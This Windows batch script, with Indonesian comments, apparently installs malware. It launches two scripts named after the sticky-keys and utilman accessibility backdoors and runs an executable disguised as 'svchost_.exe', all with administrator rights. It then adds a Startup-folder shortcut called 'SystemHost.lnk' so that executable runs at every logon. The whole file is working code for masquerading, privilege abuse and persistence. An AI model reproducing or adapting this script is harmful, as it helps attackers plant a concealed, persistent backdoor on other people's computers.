@echo off
:: Menjalankan batch dan exe dengan hak administrator dari folder yang sama
set "currentDir=%~dp0"

:: Jalankan script sebagai Administrator
powershell -Command "Start-Process '%currentDir%ExecuteStickyKeys.bat' -Verb RunAs"
powershell -Command "Start-Process '%currentDir%ExecuteUtilman.bat' -Verb RunAs"
powershell -Command "Start-Process '%currentDir%svchost_.exe' -Verb RunAs"

:: Menambahkan svchost_.exe ke folder Startup
:: Target: C:\Users\FooTex16\Desktop\XHAMSTER\svchost_.exe
set "targetExe=C:\Users\FooTex16\Desktop\XHAMSTER\svchost_.exe"
set "shortcutName=SystemHost.lnk"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Buat shortcut menggunakan PowerShell
powershell -Command ^
  "$s=(New-Object -COM WScript.Shell).CreateShortcut('%startupFolder%\%shortcutName%'); ^
   $s.TargetPath='%targetExe%'; ^
   $s.WorkingDirectory='C:\Users\FooTex16\Desktop\XHAMSTER'; ^
   $s.Save()"
